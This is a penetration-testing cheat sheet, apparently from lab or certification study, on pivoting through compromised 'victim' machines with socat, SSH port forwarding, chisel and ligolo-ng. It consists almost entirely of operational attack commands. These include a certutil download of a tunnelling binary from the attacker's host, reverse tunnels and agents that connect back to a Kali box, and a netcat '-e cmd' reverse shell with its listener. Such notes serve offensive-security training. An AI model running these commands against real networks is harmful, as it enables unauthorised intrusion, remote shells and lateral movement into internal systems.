# SOCAT
```bash
#run it on victims machine
socat -ddd TCP-LISTEN:2345,fork TCP:<victim-ip>:5432
```
-----------------------
# SSH


#* *Local port forwarding* Created with option -L
```bash
   ssh -N -L 0.0.0.0:4455:172.16.50.217:445 user@server
```
#* *Dynamic port forwarding*: Created with option -D
```bash
   ssh -N -D 0.0.0.0:9999 database_admin@10.4.50.215
```
#* *Remote port forwarding*: Created with option -R
   First we start a local ssh server
```bash
   sudo systemctl start ssh
```
   Then we connect back to it from the remote machine. In this case,
   we want to listen on port 2345 on our Kali machine
   (127.0.0.1:2345), and forward all traffic to the PostgreSQL port
   on PGDATABASE01 (10.4.50.215:5432).
```bash
   ssh -N -R 127.0.0.1:2345:10.4.50.215:5432 kali@192.168.118.4
```
#* *Remote dynamic port forwarding*: Created with option -R but without specifying endpoints.
   First we start a local ssh server
```bash
   sudo systemctl start ssh
```
   Then we connect back to it from the remote machine. This creates
   a SOCKS5 proxy on our local machine at that port which is able to
   access all interfaces that are available to the victim machine.
```bash
   ssh -N -R 9998 kali@192.168.118.4
```
-----------------------
# CHISEL
| For double pivoting https://ap3x.github.io/posts/pivoting-with-chisel/

First we download the executable on the remote machine
```bash
certutil -urlcache -split -f "http://<kali-ip>/chisel64.exe" chisel64.exe
```
then we start the executable on our linux attacker box
```bash
./chisel server -p 8000 --reverse
```
and then we connect to it from the remote machine using our IP during the connection.
```bash
chisel64.exe client <kali-ip>:8000 R:socks
```
This, by default, will create a SOCKS5 proxy within the endpoint
127.0.0.1:1080 of our local machine. To access that proxy we can
edit the proxychains conf in order to put at the end
```bash
socks5 127.0.0.1 1080

```
-----------------------
# CHISEL Single port

First we download the executable on the remote machine
```bash
certutil -urlcache -split -f "http://<kali-ip>/chisel64.exe" chisel64.exe
```
then we start the executable on our linux attacker box
```bash
./chisel64.elf server -p 8000 --reverse
```
and then we connect to it from the remote machine using our IP during the connection.
```bash
./chisel client 192.168.45.222:8080 R:8000:127.0.0.1:8000
```
-----------------------
# Ligolo

Download agent for victim from ligolo-updates or use the ones in transfers
1. Transfer the agent to the victim
https://www.youtube.com/watch?v=DM1B8S80EvQ&ab_channel=GonskiCyber
| For double pivoting refer to this link https://systemweakness.com/double-pivoting-for-newbies-with-ligolo-ng-4177b3f1f27b

Add ligolo interface (in kali)
```bash
sudo ip tuntap add user sombi mode tun ligolo
sudo ip link set ligolo up
```
In kali run proxy (in kali)
```bash
./proxy -selfcert
```
In victim connect back to our kali (in victim)
```bash
.\agent.exe -connect 192.168.45.210:11601 -ignore-cert
```
Attach session (in kali/ligolo)
```bash
session [session to attach]
```
Get internal ip (in kali/ligolo)
```bash
ifconfig
```
Add internal interface to routes (in kali)
```bash
sudo ip route add 10.10.103.0/24 dev ligolo
sudo ip route add 240.0.0.1/32 dev ligolo (for 127.0.0.1 running port)

ip route list
```
Start pivoting (in kali/ligolo)
```bash
start
```
(Reverse shells)

Add a listener to our session (in kali/ligolo)
```bash
listener_add --addr 0.0.0.0:1234 --to 127.0.0.1:4444
```
On machine that cannot reach us
```bash
nc64.exe <ip-of-machine-running-agent> 1234 -e cmd

# On kali
rlwrap nc -lvnp 4444

(Double Pivot)
listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601 --tcp
session [attach 2]
ifconfig
sudo ip route add 10.20.103.0/24 dev ligolo
```
